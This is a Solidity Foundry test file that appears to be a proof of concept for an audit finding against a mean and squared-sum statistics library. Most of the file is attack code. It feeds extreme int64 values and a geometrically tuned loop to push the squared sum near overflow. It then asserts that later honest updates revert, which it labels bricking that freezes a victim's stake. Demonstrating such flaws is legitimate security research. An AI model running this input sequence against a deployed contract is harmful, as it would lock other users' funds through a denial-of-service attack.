// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Test} from "forge-std/Test.sol";
library LibSD {
    struct SD { int64 mean; int64 sqSum; }
    function add(SD storage self, int64 x_, int64 c_) internal {
        int64 om = self.mean;
        self.mean = self.mean + (x_ - self.mean) / c_;
        self.sqSum = self.sqSum + (x_ - self.mean) * (x_ - om);
    }
}
contract Wrap { using LibSD for LibSD.SD; LibSD.SD public s;
    function add(int64 x, int64 c) external { s.add(x,c); }
    function get() external view returns (int64,int64){ return (s.mean,s.sqSum);} }

contract LibSD2 is Test {
    Wrap w; int64 constant XMAX=2147483647; int64 constant IMAX=9223372036854775807;
    function setUp() public { w = new Wrap(); }
    function _try(int64 x,int64 c) internal returns(bool){ try w.add(x,c){return true;}catch{return false;} }

    function test_onchain_counts_brick() public {
        int64 c = 0;
        c++; assertTrue(_try(XMAX, c), "s1");   // mean=XMAX
        c++; assertTrue(_try(-XMAX, c), "s2");  // sqSum~9.2233720e18, mean~0
        // shrink margin geometrically: x centered on current mean so product=(x-mean)^2~0.9*margin
        for (uint256 i=0;i<80;i++){
            (int64 m,int64 sq)=w.get(); int64 margin = IMAX - sq;
            if (margin < 100000) break;
            c++;
            int64 d = int64(int256(_isqrt(uint256(int256(margin)) * 9 / 10)));
            if (d < 1) d = 1;
            int64 x = m + d;
            if (!_try(x, c)) { _try(m + d/2, c); }
        }
        (int64 mf,int64 sqf)=w.get();
        emit log_named_int("attacker-final mean", mf);
        emit log_named_int("attacker-final margin", IMAX - sqf);

        // victims at subsequent counts with realistic tps far from the (odd) corrupted mean
        int64[3] memory vt = [int64(1000), 30000, 500000];
        for (uint256 i=0;i<3;i++){
            c++;
            bool ok = _try(vt[i], c);
            emit log_named_int("victim tpsScaled1000", vt[i]);
            emit log_named_string("  result", ok ? "survived" : "BRICKED (closeSession reverts -> stake frozen)");
            assertFalse(ok, "victim must brick");
        }
    }
    function _isqrt(uint256 n) internal pure returns(uint256 x){ if(n==0)return 0; x=n; uint256 y=(x+1)/2; while(y<x){x=y;y=(x+n/x)/2;} }
}
